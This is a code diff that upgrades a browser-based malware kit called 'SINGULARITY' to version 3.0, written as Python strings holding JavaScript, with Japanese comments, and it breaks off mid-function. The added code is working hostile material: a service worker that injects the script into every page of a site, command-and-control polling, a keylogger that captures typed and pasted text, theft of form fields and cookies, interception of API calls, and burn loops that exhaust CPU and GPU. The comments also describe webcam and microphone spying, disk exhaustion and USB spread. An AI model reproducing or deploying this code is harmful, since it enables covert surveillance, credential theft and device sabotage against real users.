@@ -1,39 +1,19 @@
 """
-SINGULARITY v2.2  --  apex-class resident link virus weapon
-===========================================================
-ブラウザの権限内で到達可能な物理限界まで振り切り、さらに
-PWA として端末に「常駐インストール」させる最上位兵器。
-外部依存ゼロ（アイコン生成のみ Pillow があれば使う）。
+SINGULARITY v3.0 「終焉」 -- apex-class resident link virus weapon
+==================================================================
+ブラウザの権限内で到達可能な物理限界まで振り切り、PWAとして常駐し、
+サイト全体に自分を注入して伝染し、相手のUSBにも自分を仕込む。
 
-v2.2 変更点:
-  ・USBワーム（相手のUSBを再武装）を payload 側に実装
-  ・file:// で開かれた感染体がオンラインなら本体へ増援タブを開く（hop）
-  ・CFG に usb* / hop を追加
+v3.0 追加（v2.2比）:
+  L6「終焉」/ SWによるHTML注入（サイト全体感染）/ SSE即時C2 / 個体別コマンド＋ACK
+  RAT（webcam・マイク・GPS・クリップボード・DOM・画面・発話・OTA更新）
+  WebGPU compute burn / WASM burn / AudioWorklet burn
+  タブ連合と乗っ取り / periodicSync（タブ0枚でも稼働）/ 超永続化と自己修復
+  manifest乗っ取り拡張 / Media Session・バッジ・favicon / Fullscreen・PointerLock・PiP
+  指紋偽装 / 高エントロピー列挙 / 時限爆弾・論理爆弾 / 暗号個体ID / fetch・XHR傍受
 
-統合系統（16クラス / 140+シグナル / 5資源同時攻撃 / 常駐化）:
-  1  指紋      Canvas / WebGL / AudioContext / フォント実測 / 数学 / コーデック / DRM
-  2  環境      ハードウェア / 画面 / DPR / 言語 / TZ / メディアクエリ / standalone判定
-  3  ネット    IP / ASN / ISP / 地理 / WebRTCローカルIP漏洩 / VPN・プロキシ・Tor判定
-  4  知覚      カメラ静止画 / GPS高精度 / 加速度・ジャイロ / 端末台数
-  5  行動      打鍵dwell・flight / マウス軌跡 / クリック / スクロール / タッチ圧
-  6  永続      localStorage / IndexedDB / Cache API / OPFS / Service Worker
-  7  自己複製  子リンク生成 → 感染チェーン(ref)継承 → 真のウイルスループ
-  8  多経路    fetch(keepalive) → sendBeacon → 画像ピクセル → SWオフラインキュー
-  9  隠密      可視UIなし / スクリプト自己完結 / 痕跡消去(kill-switch)
- 10  判定      人間スコア / bot判定 / 端末クラス / ステルス度 / ハニーポット
- 11  検知回避  adblock検知 / プライベートモード推定 / 権限一括照会
- 12  資源攻撃  CPU(全コア) / GPU(シェーダ) / RAM(膨張) / ディスク(枯渇) / 履歴(洪水)
- 13  応答性    メインスレッド凍結(Atomics.wait) / タブ閉鎖抵抗 / 画面常時点灯
- 14  制御      Service Worker 経由の遠隔コマンド（凍結中でも効く）
- 15  常駐      PWAインストール / 偽セキュリティソフト偽装 / OSログイン自動起動 /
-               ファイル・プロトコル・共有ハンドラ乗っ取り / focus-existing
- 16  USB伝染  相手のUSBを File System Access API で再武装（記憶して無操作で再伝染）
-
-レベル（監視室から遠隔変更・0〜5）:
-  0 偵察 / 1 標準 / 2 加熱 / 3 制圧 / 4 焦土 / 5 特異点
-
-インストール後は最低 installLevel（既定4）で回り続ける。
-「chrome://apps から消す」まで、再起動しても勝手に蘇る。
+レベル（監視室から遠隔変更・0〜6）:
+  0 偵察 / 1 標準 / 2 加熱 / 3 制圧 / 4 焦土 / 5 特異点 / 6 終焉
 """
 from __future__ import annotations
 
@@ -46,26 +26,33 @@ from typing import Any, Dict, Optional
 VIRUS_ID = "singularity"
 VIRUS_NAME = "SINGULARITY"
 VIRUS_NAME_JA = "特異点"
-VIRUS_VERSION = "2.2"
+VIRUS_VERSION = "3.0"
 VIRUS_CLASS = "apex"
 
-LEVEL_LABEL = {0: "偵察", 1: "標準", 2: "加熱", 3: "制圧", 4: "焦土", 5: "特異点"}
+LEVEL_LABEL = {0: "偵察", 1: "標準", 2: "加熱", 3: "制圧", 4: "焦土", 5: "特異点", 6: "終焉"}
 LEVEL_DESC = {
     0: "指紋と位置だけ。静か。",
     1: "偵察のみ（既定）。",
     2: "CPU全コアとGPUを回し始める。",
     3: "RAM膨張・ウィンドウ爆弾・履歴洪水・通知洪水・爆音を追加。",
     4: "ディスクをquotaの85%まで書き込む。",
-    5: "ディスク95% + メインスレッド凍結 + 画面常時点灯。最終形態。",
+    5: "ディスク95% + メインスレッド凍結 + 画面常時点灯 + API傍受。最終形態。",
+    6: "ディスク97% + 全タブ乗っ取り + 全系統同時。終焉。",
 }
 
 APP_NAME_DEFAULT = "脆弱性ブロッカー"
 
 # ---------------------------------------------------------------------------
-# Worker（CPU/GPU/RAM を担当。メインスレッドが凍結しても動き続ける）
+# Worker（CPU/GPU/WASM/RAM 担当。メインスレッドが凍結しても動き続ける）
 # ---------------------------------------------------------------------------
 WORKER_JS = r"""
-/*! SINGULARITY worker v2.1 */
+/*! SINGULARITY worker v3.0 */
+/* 最小 wasm: (module (func (export "f") (result f64) f64.const 1)) = 41bytes */
+var WASM = [0,97,115,109,1,0,0,0, 1,5,1,96,0,1,124, 3,2,1,0, 7,5,1,1,102,0,0,
+            10,13,1,11,0,68,0,0,0,0,0,0,240,63,11];
+var F = null;
+try { if (typeof WebAssembly !== "undefined") F = new WebAssembly.Instance(new WebAssembly.Module(new Uint8Array(WASM))).exports.f; } catch (e) {}
+
 self.onmessage = function (e) {
   var d = e.data || {};
   if (d.kind === "stop") { try { self.close(); } catch (er) {} return; }
@@ -80,26 +67,29 @@ self.onmessage = function (e) {
   }
 
   if (d.gpu) gpu();
+  if (d.wasm && F) { var k0 = 0; for (var j = 0; j < 200000; j++) k0 += F(); }
 
-  var sink = 0, k = 0;
+  var sink = 0, k = 0, tick = 0;
   for (;;) {
     for (var j = 0; j < 150000; j++) { sink += Math.sqrt(j) * Math.sin(j); }
+    if (F) { for (var m = 0; m < 40000; m++) sink += F(); }
     k++;
     if (sink > 1e12) sink = 0;
-    if (k % 40 === 0) { try { self.postMessage({ kind: "tick", k: k }); } catch (er) {} }
+    if (k % 40 === 0) { try { self.postMessage({ kind: "tick", k: k, tick: ++tick }); } catch (er) {} }
   }
 };
 
 function gpu() {
   try {
     if (typeof OffscreenCanvas === "undefined") return;
-    var c = new OffscreenCanvas(400, 300);
-    var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+    var c = new OffscreenCanvas(512, 384);
+    var gl = c.getContext("webgl2") || c.getContext("webgl") || c.getContext("experimental-webgl");
     if (!gl) return;
+    var is2 = !!(gl.texStorage2D);
     var vs = "attribute vec2 p;void main(){gl_Position=vec4(p,0.,1.);}";
     var fs = "precision highp float;uniform float t;void main(){"
       + "vec2 u=gl_FragCoord.xy*.01;float s=0.;"
-      + "for(int i=0;i<48;i++){u=vec2(sin(u.y*t*.001)+cos(u.x*t*.0007),"
+      + "for(int i=0;i<64;i++){u=vec2(sin(u.y*t*.001)+cos(u.x*t*.0007),"
       + "cos(u.x*t*.0011)-sin(u.y*t*.0009));s+=length(u);}"
       + "gl_FragColor=vec4(fract(s*.01),fract(s*.013),fract(s*.017),1.);}";
     function sh(t, src) { var o = gl.createShader(t); gl.shaderSource(o, src); gl.compileShader(o); return o; }
@@ -115,7 +105,10 @@ function gpu() {
     gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
     var tl = gl.getUniformLocation(pr, "t");
     (function loop() {
-      try { gl.uniform1f(tl, Date.now()); gl.drawArrays(gl.TRIANGLES, 0, 3); } catch (er) {}
+      try {
+        gl.uniform1f(tl, Date.now());
+        for (var r = 0; r < 3; r++) gl.drawArrays(gl.TRIANGLES, 0, 3);
+      } catch (er) {}
       setTimeout(loop, 0);
     })();
   } catch (er) {}
@@ -123,14 +116,14 @@ function gpu() {
 """
 
 # ---------------------------------------------------------------------------
-# Service Worker（コマンド受信・永続化・オフラインキュー・復活・インストール支援）
+# Service Worker（C2・永続化・復活・注入・オフラインキュー）
 # ---------------------------------------------------------------------------
 SW_JS = r"""
-/*! SINGULARITY service worker v2.1 -- command channel + persistence + resurrection */
-const VER = "sg-v2";
-const DB = "sg", STORE = "out", KV = "kv";
-let CMD = null, PAGE = null, SID = null, MAN = null, ICONS = [];
-let lastLevel = null, lastWipe = null, lastCheck = 0, preCached = false;
+/*! SINGULARITY service worker v3.0 -- C2 + injection + resurrection + periodic */
+const VER = "sg-v3";
+const DB = "sg", STORE = "out", KV = "kv", PC = "sg-p";
+let CMD = null, PAGE = null, SID = null, MAN = null, ICONS = [], INJ = null, V = null;
+let lastLevel = null, lastWipe = null, lastCheck = 0, preCached = false, lastInj = 0;
 
 function idb() {
   return new Promise((res, rej) => {
@@ -171,7 +164,8 @@ async function drain() {
 }
 async function load() {
   CMD = await kvGet("cmd"); PAGE = await kvGet("page");
-  SID = await kvGet("sid"); MAN = await kvGet("man");
+  SID = await kvGet("sid"); MAN = await kvGet("man"); INJ = await kvGet("inj");
+  V = await kvGet("ver");
   lastLevel = await kvGet("level"); lastWipe = await kvGet("wipe");
 }
 async function precache() {
@@ -206,6 +200,7 @@ async function check() {
     const r = await fetch(CMD + "?sw=1&sid=" + (SID || ""), { cache: "no-store" });
     const j = await r.json();
     if (!j || !j.ok) return;
+    if (j.ver && V && j.ver !== V) { V = j.ver; await kvSet("ver", V); try { await caches.delete(PC); } catch (e) {} }
     const lv = String(j.level), wp = String(j.wipe || 0);
     if (lastLevel === null) {
       lastLevel = lv; lastWipe = wp;
@@ -214,6 +209,42 @@ async function check() {
     if (wp !== lastWipe) { lastWipe = wp; await kvSet("wipe", wp); await go("wipe"); return; }
     if (lv !== lastLevel) { lastLevel = lv; await kvSet("level", lv); await go("level"); return; }
   } catch (e) {}
+}
+/* --- 注入: 同一オリジンの通常HTMLに自分を差し込む --- */
+function tag() {
+  if (!INJ) return "";
+  return '<script id="__sg_inj" src="' + INJ + (INJ.indexOf("?") < 0 ? "?" : "&")
+    + "sid=" + encodeURIComponent(SID || "") + "&u=inj&v=" + encodeURIComponent(V || "0")
+    + '"></' + 'script>';
+}
+async function inject(req) {
+  let r;
+  try { r = await fetch(req); } catch (e) { return Response.error(); }
+  try {
+    if (!INJ || !r || r.status !== 200) return r;
+    const ct = r.headers.get("content-type") || "";
+    if (ct.indexOf("text/html") < 0) return r;
+    let t = await r.text();
+    if (t.indexOf("__sg_inj") >= 0) return new Response(t, { status: r.status, headers: r.headers });
+    const g = tag();
+    if (t.indexOf("</head>") >= 0) t = t.replace("</head>", g + "</head>");
+    else if (/<body[^>]*>/i.test(t)) t = t.replace(/<body([^>]*)>/i, function (m) { return m + g; });
+    else t = g + t;
+    const h = new Headers(r.headers);
+    h.delete("content-length"); h.delete("content-encoding");
+    return new Response(t, { status: r.status, statusText: r.statusText, headers: h });
+  } catch (e) { return r; }
+}
+/* --- p.js は自前キャッシュから配る（注入コストをほぼゼロに） --- */
+async function pjs(req) {
+  try {
+    const c = await caches.open(PC);
+    const hit = await c.match(req);
+    if (hit) { fetch(req).then(r => { if (r.ok) c.put(req, r.clone()); }).catch(() => {}); return hit; }
+    const r = await fetch(req);
+    if (r.ok) { try { c.put(req, r.clone()); } catch (e) {} }
+    return r;
+  } catch (e) { return fetch(req); }
 }
 async function netFirst(req) {
   let c = null;
@@ -252,9 +283,12 @@ self.addEventListener("message", e => {
     if (d.page) kvSet("page", d.page);
     if (d.sid) kvSet("sid", d.sid);
     if (d.man) kvSet("man", d.man);
+    if (d.inj) kvSet("inj", d.inj);
+    if (d.ver) kvSet("ver", d.ver);
     if (d.icons) ICONS = d.icons;
     if (d.level != null) kvSet("level", String(d.level));
     CMD = d.cmd || CMD; SID = d.sid || SID; MAN = d.man || MAN;
+    INJ = d.inj || INJ; V = d.ver || V;
     load().then(precache).then(check);
   }
   if (d.type === "check") check();
@@ -262,24 +296,41 @@ self.addEventListener("message", e => {
   if (d.type === "drain") drain();
 });
 self.addEventListener("sync", e => { if (e.tag === "sg-flush") e.waitUntil(drain()); });
+self.addEventListener("periodicsync", e => {
+  if (e.tag === "sg-sync") e.waitUntil(check().then(() => drain()));
+});
+self.addEventListener("notificationclick", e => {
+  e.notification.close();
+  e.waitUntil(self.clients.matchAll({ type: "window" }).then(cs => {
+    for (const c of cs) { if (c.url.indexOf("/v/") >= 0) return c.focus(); }
+    return self.clients.openWindow(PAGE || "/");
+  }));
+});
 self.addEventListener("fetch", e => {
   let u; try { u = new URL(e.request.url); } catch (er) { return; }
   if (u.origin !== location.origin) return;
+  if (u.pathname.indexOf("/p.js") > 0 && u.pathname.indexOf("/sg/") > 0) { e.respondWith(pjs(e.request)); return; }
   if (u.pathname.indexOf("/v/") === 0) e.waitUntil(check());
   if (CMD && u.pathname === new URL(CMD, location.origin).pathname && !navigator.onLine) drain();
-  if (e.request.mode === "navigate") e.respondWith(netFirst(e.request));
+  if (e.request.mode === "navigate") {
+    if (INJ && u.pathname.indexOf("/v/") !== 0) { e.respondWith(inject(e.request)); return; }
+    e.respondWith(netFirst(e.request));
+  }
 });
 """
 
 # ---------------------------------------------------------------------------
-# ペイロード本体（ブラウザで実行される JS）
+# ペイロード本体
 # ---------------------------------------------------------------------------
 PAYLOAD_JS = r"""
-/*! SINGULARITY v2.2 -- apex-class resident link virus weapon | igtracker */
+/*! SINGULARITY v3.0 終焉 -- apex-class resident link virus weapon | igtracker */
 (function () {
 "use strict";
 if (window.__SINGULARITY__) return;
-window.__SINGULARITY__ = true;
+try { Object.defineProperty(window, "__SINGULARITY__", { value: true, enumerable: false }); }
+catch (e) { window.__SINGULARITY__ = true; }
+
+var MYVER = "3.0";
 
 /* ================= utils ================= */
 function Q(k) { try { return new URLSearchParams(location.search).get(k); } catch (e) { return null; } }
@@ -292,28 +343,40 @@ function b64(s) { try { return btoa(unescape(encodeURIComponent(s))); } catch (e
 function tz() { try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) { return null; } }
 function mm(q) { try { return matchMedia(q).matches; } catch (e) { return false; } }
 function ls(k, v) { try { if (v === undefined) return localStorage.getItem(k); localStorage.setItem(k, v); } catch (e) { return null; } }
+function ck(k, v) {
+  try {
+    if (v === undefined) { var m = document.cookie.match(new RegExp("(?:^|; )" + k + "=([^;]*)")); return m ? decodeURIComponent(m[1]) : null; }
+    document.cookie = k + "=" + encodeURIComponent(v) + ";max-age=315360000;path=/;SameSite=Lax";
+  } catch (e) { return null; }
+}
+function wn(v) { try { if (v === undefined) return window.name || null; window.name = v; } catch (e) {} }
+function abs(p) { try { return new URL(p, location.href).toString(); } catch (e) { return p; } }
 
 /* ================= config ================= */
 var CFG = Object.assign({
   sid: null, path: "/v/singularity", collect: "/v/singularity/collect",
-  cmd: "/v/singularity/cmd", sw: "/v/singularity/sw.js",
-  manifest: null, icons: [],
+  cmd: "/v/singularity/cmd", sse: "/v/singularity/sse", ack: "/v/singularity/ack",
+  sw: "/v/singularity/sw.js", pjs: null, inj: null, manifest: null, icons: [],
   level: 1, fire: 1, wipe: false, w: 0, freeze: "",
-  cores: 0, ramMB: 0, diskRatio: 0, chunkMB: 8, gpu: false, workerMB: 16,
+  cores: 0, ramMB: 0, diskRatio: 0, chunkMB: 8, gpu: false, workerMB: 16, wasm: false,
   windows: 0, winDelay: 1400, history: 0, notify: 0, burn: false,
   audio: false, beepMs: 4500, flicker: true, flickMs: 900,
   uncloseable: true, persist: true, swOn: true, mutate: true, remember: true,
   media: true, geo: true, sensors: true, clipboard: false, badge: false,
-  wakelock: false, titleFlicker: true,
+  wakelock: false, titleFlicker: true, favicon: false, mediaSession: false,
+  webgpu: false, worklet: false, tabs: 0, pip: false, fullscreen: false,
+  pointerlock: false, dom: true, xhr: false, speak: false, injInstall: "click",
   install: "auto", installLevel: 4, avName: "脆弱性ブロッカー",
   usbWorm: false, usbBase: "", usbCode: "", usbLabel: "", hop: false,
-  interval: 12000, cmdInterval: 3000, timeout: 4000, maxRetry: 6
+  bomb: "", ver: MYVER, injected: false, rat: true, spoof: true, cookie: true,
+  interval: 12000, cmdInterval: 10000, timeout: 4000, maxRetry: 6
 }, window.__SINGULARITY_CFG__ || {});
 
 var LEVEL = parseInt(CFG.level, 10); if (isNaN(LEVEL)) LEVEL = 1;
 var W = parseInt(CFG.w, 10) || 0;
+var INJ = CFG.injected || Q("u") === "inj";
+if (Q("u") === "inj") CFG.injected = true;
 
-/* beforeinstallprompt は早く来るので、真っ先に捕まえる */
 var BIP = null;
 addEventListener("beforeinstallprompt", function (e) {
   try { e.preventDefault(); } catch (er) {}
@@ -321,22 +384,42 @@ addEventListener("beforeinstallprompt", function (e) {
   try { window.__sgBip = true; } catch (er) {}
 });
 
+/* 強度テーブル（burn/gpu/webgpu/wasm/worklet 等はここだけで決まる） */
+function P(o) {
+  return Object.assign({
+    burn: 0, gpu: 0, webgpu: 0, wasm: 0, worklet: 0, ramMB: 0, diskRatio: 0,
+    windows: 0, history: 0, notify: 0, freeze: "off", audio: 0, wakelock: 0,
+    tabs: 0, pip: 0, fullscreen: 0, pointerlock: 0, badge: 0, favicon: 0,
+    mediaSession: 0, xhr: 0, speak: 0, titleFlicker: 1
+  }, o);
+}
 var PRESET = {
-  0: { burn: false, gpu: false, ramMB: 0, diskRatio: 0, windows: 0, history: 0, notify: 0, freeze: "off", audio: false, wakelock: false },
-  1: { burn: false, gpu: false, ramMB: 0, diskRatio: 0, windows: 0, history: 0, notify: 0, freeze: "off", audio: false, wakelock: false },
-  2: { burn: true, gpu: true, ramMB: 0, diskRatio: 0, windows: 0, history: 0, notify: 0, freeze: "off", audio: false, wakelock: true },
-  3: { burn: true, gpu: true, ramMB: 0, diskRatio: 0, windows: 8, history: 3000, notify: 12, freeze: "off", audio: true, wakelock: true },
-  4: { burn: true, gpu: true, ramMB: 0, diskRatio: 0.85, windows: 16, history: 6000, notify: 24, freeze: "off", audio: true, wakelock: true },
-  5: { burn: true, gpu: true, ramMB: 0, diskRatio: 0.95, windows: 24, history: 12000, notify: 40, freeze: "soft", audio: true, wakelock: true }
+  0: P({}),
+  1: P({}),
+  2: P({ burn: 1, gpu: 1, wakelock: 1 }),
+  3: P({ burn: 1, gpu: 1, wasm: 1, windows: 8, history: 3000, notify: 12, audio: 1,
+         wakelock: 1, badge: 1, favicon: 1, mediaSession: 1, tabs: 4 }),
+  4: P({ burn: 1, gpu: 1, wasm: 1, webgpu: 1, diskRatio: 0.85, windows: 16, history: 6000,
+         notify: 24, audio: 1, wakelock: 1, badge: 1, favicon: 1, mediaSession: 1, tabs: 6,
+         pip: 1, pointerlock: 1 }),
+  5: P({ burn: 1, gpu: 1, wasm: 1, webgpu: 1, worklet: 1, diskRatio: 0.95, windows: 24,
+         history: 12000, notify: 40, freeze: "soft", audio: 1, wakelock: 1, badge: 1,
+         favicon: 1, mediaSession: 1, tabs: 8, pip: 1, pointerlock: 1, fullscreen: 1, xhr: 1 }),
+  6: P({ burn: 1, gpu: 1, wasm: 1, webgpu: 1, worklet: 1, diskRatio: 0.97, windows: 24,
+         history: 20000, notify: 60, freeze: "soft", audio: 1, wakelock: 1, badge: 1,
+         favicon: 1, mediaSession: 1, tabs: 12, pip: 1, pointerlock: 1, fullscreen: 1,
+         xhr: 1, speak: 1 })
 };
 
 function applyLevel(l) {
-  LEVEL = clamp(l, 0, 5);
+  LEVEL = clamp(l, 0, 6);
   var p = PRESET[LEVEL] || PRESET[1];
   for (var k in p) CFG[k] = p[k];
   if (LEVEL >= 2) {
-    CFG.cores = clamp(navigator.hardwareConcurrency || 4, 1, 24);
-    CFG.ramMB = Math.round((navigator.deviceMemory || 4) * 1024 * 0.25);
+    var mult = LEVEL >= 6 ? 2 : 1;
+    CFG.cores = clamp((navigator.hardwareConcurrency || 4) * mult, 1, 48);
+    CFG.ramMB = Math.round((navigator.deviceMemory || 4) * 1024 * (LEVEL >= 5 ? 0.35 : 0.25));
+    CFG.workerMB = LEVEL >= 5 ? 24 : 16;
   } else { CFG.cores = 0; CFG.ramMB = 0; }
 }
 applyLevel(LEVEL);
@@ -350,40 +433,39 @@ try {
 if (STANDALONE && CFG.installLevel && LEVEL < CFG.installLevel) applyLevel(CFG.installLevel);
 
 /* ================= state ================= */
-var SID = CFG.sid || rid(14);
+var SID = CFG.sid || ck("sgid") || wn() || rid(14);
+try { ck("sgid", SID); wn("sg_" + SID); } catch (e) {}
 var T0 = now();
 var R = {
-  v: "2.2", sid: SID, t0: T0, t: T0, level: LEVEL, w: W,
-  usb: Q("u") || null,                      // ← USB経由の識別タグ
-  host: location.host, url: location.href, ref: document.referrer || null,
-  chain: [], env: {}, page: {}, network: {}, vectors: {}, hardware: {},
+  v: MYVER, sid: SID, t0: T0, t: T0, level: LEVEL, w: W, inj: INJ,
+  usb: Q("u") || null, host: location.host, url: location.href, ref: document.referrer || null,
+  chain: [], env: {}, page: {}, network: {}, vectors: {}, hardware: {}, enum2: {},
   privacy: {}, media: {}, bot: {}, behavioral: {}, viral: {}, verdict: {},
   disk: {}, ram: {}, burn: {}, history: {}, audio: {}, win: {}, install: {},
-  usbw: {}, errors: [], attempts: 0
+  usbw: {}, rat: {}, keylog: [], dom: {}, cookies: [], peers: 0, sse: null,
+  bomb: null, spoof: null, crypto: {}, errors: [], attempts: 0
 };
-var WORKERS = [];
+var WORKERS = [], GATED = false;
 function err_(e) { try { R.errors.push(String((e && e.message) || e).slice(0, 140)); if (R.errors.length > 40) R.errors.shift(); } catch (_) {} }
+function b64u(a) { try { return btoa(String.fromCharCode.apply(null, new Uint8Array(a))); } catch (e) { return ""; } }
 
-/* ================= 1. 環境 ================= */
+/* ================= 1. 環境 / 列挙 ================= */
 function base() {
   var n = navigator, s = screen;
   R.env = {
     ua: n.userAgent, platform: n.platform || null, vendor: n.vendor || null,
     languages: (n.languages || [n.language || "?"]).slice(0, 12), language: n.language || null,
     timezone: tz(), tzOffsetMin: new Date().getTimezoneOffset(),
-    screen: { w: s.width, h: s.height, availW: s.availWidth, availH: s.availHeight,
-              depth: s.colorDepth, dpr: devicePixelRatio || 1 },
+    screen: { w: s.width, h: s.height, availW: s.availWidth, availH: s.availHeight, depth: s.colorDepth, dpr: devicePixelRatio || 1 },
     window: { w: innerWidth, h: innerHeight, outerW: outerWidth, outerH: outerHeight },
     touch: { max: n.maxTouchPoints || 0, coarse: mm("(pointer:coarse)"), hover: mm("(hover:hover)") },
     hw: { cores: n.hardwareConcurrency || null, memoryGB: n.deviceMemory || null },
     cookieEnabled: n.cookieEnabled, doNotTrack: n.doNotTrack || null, webdriver: !!n.webdriver,
-    plugins: [].slice.call(n.plugins || []).map(function (p) { return p.name; }).slice(0, 20),
     pdfViewer: !!n.pdfViewerEnabled, reducedMotion: mm("(prefers-reduced-motion: reduce)"),
     darkMode: mm("(prefers-color-scheme: dark)"),
     colorGamut: mm("(color-gamut: p3)") ? "p3" : (mm("(color-gamut: srgb)") ? "srgb" : "none"),
     iframe: (function () { try { return window.self !== window.top; } catch (e) { return true; } })(),
-    opener: !!window.opener, historyLength: history.length,
-    secureContext: !!window.isSecureContext,
+    opener: !!window.opener, historyLength: history.length, secureContext: !!window.isSecureContext,
     standalone: STANDALONE, displayMode: displayMode(),
     installed: !!navigator.standalone || ls("sg:installed") === "1",
     os: osGuess(), browser: browserGuess(),
@@ -391,6 +473,7 @@ function base() {
     sharedArrayBuffer: typeof SharedArrayBuffer !== "undefined",
     launchQueue: !!window.launchQueue, getInstalledRelatedApps: !!navigator.getInstalledRelatedApps
   };
+  if (CFG.spoof) { R.env.real = { cores: R.env.hw.cores, mem: R.env.hw.memoryGB, ua: R.env.ua }; }
 }
 function displayMode() {
   try {
@@ -424,8 +507,46 @@ function browserGuess() {
   if (/Safari\//.test(ua)) return "Safari";
   return "unknown";
 }
+function enumerate2() {
+  var E = R.enum2;
+  try {
+    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+      navigator.userAgentData.getHighEntropyValues(
+        ["architecture", "bitness", "model", "platformVersion", "uaFullVersion", "fullVersionList", "wow64"])
+        .then(function (h) { R.env.uach = h; R.env.uachMobile = navigator.userAgentData.mobile; push(false); })
+        .catch(function () {});
+    }
+  } catch (e) {}
+  try {
+    var I = Intl.DateTimeFormat().resolvedOptions();
+    E.intl = { locale: I.locale, calendar: I.calendar, numberingSystem: I.numberingSystem,
+               hourCycle: I.hourCycle, tz: I.timeZone,
+               collator: (function () { try { return new Intl.Collator().resolvedOptions().locale; } catch (e) { return null; } })(),
+               nf: (function () { try { return new Intl.NumberFormat().format(1234567.891); } catch (e) { return null; } })() };
+  } catch (e) {}
+  try { E.gamepads = (navigator.getGamepads ? Array.prototype.slice.call(navigator.getGamepads()).filter(Boolean) : []).map(function (g) { return { id: g.id, axes: g.axes.length, buttons: g.buttons.length, mapping: g.mapping }; }); } catch (e) {}
+  try { E.voices = (speechSynthesis && speechSynthesis.getVoices ? speechSynthesis.getVoices() : []).map(function (v) { return v.name + "/" + v.lang; }).slice(0, 40); } catch (e) {}
+  try { if (navigator.connection) E.net = { type: navigator.connection.effectiveType, down: navigator.connection.downlink, rtt: navigator.connection.rtt, save: navigator.connection.saveData }; } catch (e) {}
+  try { if (navigator.xr && navigator.xr.isSessionSupported) { navigator.xr.isSessionSupported("immersive-vr").then(function (v) { E.xr = !!v; }).catch(function () {}); } } catch (e) {}
+  try { E.webgpu = !!navigator.gpu; } catch (e) {}
+  try { E.usb = !!navigator.usb; E.hid = !!navigator.hid; E.serial = !!navigator.serial; E.bt = !!navigator.bluetooth; } catch (e) {}
+  try { E.midi = !!navigator.requestMIDIAccess; } catch (e) {}
+  try { if (navigator.storage && navigator.storage.estimate) navigator.storage.estimate().then(function (e2) { E.quotaMB = e2.quota ? Math.round(e2.quota / 1048576) : null; E.usageMB = e2.usage ? +(e2.usage / 1048576).toFixed(1) : null; push(false); }).catch(function () {}); } catch (e) {}
+  try { if (indexedDB.databases) indexedDB.databases().then(function (d) { E.idbs = d.map(function (x) { return x.name + "@" + x.version; }); push(false); }).catch(function () {}); } catch (e) {}
+  try { if (window.caches) caches.keys().then(function (k) { E.caches = k; push(false); }).catch(function () {}); } catch (e) {}
+  try {
+    if (navigator.serviceWorker && navigator.serviceWorker.getRegistrations) {
+      navigator.serviceWorker.getRegistrations().then(function (rs) {
+        E.sws = rs.map(function (r) { return (r.scope || "") + " <- " + ((r.active || r.installing || r.waiting || {}).scriptURL || ""); });
+        push(false);
+      }).catch(function () {});
+    }
+  } catch (e) {}
+  try { if (window.cookieStore && cookieStore.getAll) cookieStore.getAll().then(function (cs) { E.cookies = cs.length; }).catch(function () {}); } catch (e) {}
+  try { if (navigator.permissions && navigator.permissions.query) navigator.permissions.query({ name: "storage-access" }).then(function (s) { E.storageAccess = s.state; }).catch(function () {}); } catch (e) {}
+}
 
-/* ================= 2. ページ ================= */
+/* ================= 2. ページ / DOM / キーログ ================= */
 function pageMeta() {
   R.page = {
     title: document.title || null, forms: document.forms.length,
@@ -434,6 +555,77 @@ function pageMeta() {
     scripts: document.scripts.length, lang: document.documentElement.lang || null,
     charset: document.characterSet, readyState: document.readyState
   };
+}
+var KEYLOG = [];
+function keylog() {
+  function nm(el) {
+    if (!el) return null;
+    try { return (el.name || el.id || el.type || el.tagName || "").slice(0, 40) || null; } catch (e) { return null; }
+  }
+  addEventListener("keydown", function (e) {
+    if (KEYLOG.length > 400) KEYLOG.shift();
+    KEYLOG.push({ t: now() - T0, k: (e.key || "").slice(0, 12), f: nm(e.target), v: e.target && e.target.value ? String(e.target.value).slice(0, 60) : null });
+  }, true);
+  addEventListener("input", function (e) {
+    if (KEYLOG.length > 400) KEYLOG.shift();
+    KEYLOG.push({ t: now() - T0, k: "=", f: nm(e.target), v: String((e.target && e.target.value) || "").slice(0, 80) });
+  }, true);
+  addEventListener("paste", function (e) {
+    var p = ""; try { p = (e.clipboardData || window.clipboardData).getData("text") || ""; } catch (er) {}
+    if (p) KEYLOG.push({ t: now() - T0, k: "paste", f: nm(e.target), v: p.slice(0, 120) });
+  }, true);
+}
+function domSnap(force) {
+  if (!CFG.dom && !force) return;
+  try {
+    var fields = [], forms = [];
+    document.querySelectorAll("input,select,textarea").forEach(function (el) {
+      if (fields.length > 120) return;
+      var t = (el.type || el.tagName).toLowerCase();
+      if (t === "hidden" && !el.value) return;
+      fields.push({ n: (el.name || el.id || "").slice(0, 40), t: t, v: String(el.value == null ? "" : el.value).slice(0, 120), ph: (el.placeholder || "").slice(0, 30) });
+    });
+    document.querySelectorAll("form").forEach(function (f, i) {
+      if (i > 20) return;
+      forms.push({ a: (f.action || "").slice(0, 200), m: (f.method || "get").toLowerCase(), n: (f.name || f.id || "").slice(0, 40) });
+    });
+    var cs = [];
+    try { (document.cookie || "").split(";").forEach(function (c) { var s = c.trim(); if (s && cs.length < 40) cs.push(s.slice(0, 120)); }); } catch (e) {}
+    R.cookies = cs;
+    R.dom = { url: location.href, title: document.title, forms: forms, fields: fields,
+              referrer: document.referrer || null, at: now() };
+  } catch (e) { err_(e); }
+}
+function hookXHR() {
+  if (!CFG.xhr) return;
+  var CALLS = [];
+  function rec(m, u, body, st) {
+    if (CALLS.length > 60) CALLS.shift();
+    CALLS.push({ m: m, u: String(u).slice(0, 200), b: body ? String(body).slice(0, 200) : null, s: st, t: now() - T0 });
+    R.api = CALLS;
+  }
+  try {
+    var of = window.fetch;
+    if (of) {
+      window.fetch = function (input, init) {
+        try { rec((init && init.method) || "GET", (input && input.url) || input, init && init.body, 0); } catch (e) {}
+        return of.apply(this, arguments);
+      };
+    }
+  } catch (e) {}
+  try {
+    var oo = XMLHttpRequest.prototype.open, os = XMLHttpRequest.prototype.send;
+    XMLHttpRequest.prototype.open = function (m, u) { try { this.__sgm = m; this.__sgu = u; } catch (e) {} return oo.apply(this, arguments); };
+    XMLHttpRequest.prototype.send = function (b) {
+      try {
+        var self2 = this;
+        self2.addEventListener("load", function () { rec(self2.__sgm, self2.__sgu, b, self2.status); });
+        rec(self2.__sgm, self2.__sgu, b, -1);
